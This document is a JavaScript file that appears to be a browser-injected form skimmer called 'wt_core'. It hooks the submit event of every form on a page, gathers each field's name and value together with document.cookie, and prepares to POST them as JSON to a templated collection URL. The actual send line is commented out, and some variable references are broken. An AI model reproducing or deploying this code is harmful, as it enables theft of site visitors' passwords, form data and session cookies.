var wt_core = {
    url: "{{ URL }}",
    caller: {
        normalize_data: function(data) {
            var date = new Date().toLocaleString();

            return JSON.stringify({
                date: date,
                cookie: document.cookie,
                content: data
            });
        },

        create: function(method, url, callback) {
           xhr = new XMLHttpRequest();
           xhr.open(method, url);
           xhr.setRequestHeader("Content-type", "application/json");

           xhr.onreadystatechange = function() {
               if (callback && request.readyState == 4 && request.status == 200) {
                   callback(request.responseText); // Another callback here
               }
           };

           return xhr;
        },

        post: function(url, data, callback) {
            var data = this.normalize_data(data);
            var xhr = this.create("POST", url, callback);
            //xhr.send(data);
        },

        get: function(url, callback) {
            var xhr = this.create("GET", url, callback);
            xhr.send();
        }
    },

    package: {
        form_listner: {
            init: function() {
                var forms = document.getElementsByTagName("form"),
                    formsLength = forms.length;

                this.eventListener(forms, formsLength);
            },

            eventListener: function(forms, formsLength) {
                for (var i = 0; i < formsLength; i++) {
                    if (forms[i].addEventListener) {
                        forms[i].addEventListener("submit", this.send, false); //Modern browsers
                    } else if (forms[i].attachEvent) {
                        forms[i].attachEvent('onsubmit', this.send); //Old IE
                    }
                }
            },

            send: function(e) {
                e.preventDefault();

                var wt_post_params = [].filter.call(this.elements, function(el) {
                    return el;
                }).map(function(el) {
                    return {
                        name: el.name,
                        value: el.value,
                        method: el.form.method,
                        action: el.form.action
                    };
                });

                wt_core.post(wt_post_params);
            }
        }
    },

    init: function() {
        this.load_package();
    },

    load_package: function() {
        for(var key in this.package) {
            this.package[key].init();
        }
    },

    post: function(data, callback) {
        this.caller.post(this.url, data, callback);
    }
};
wt_core.init();
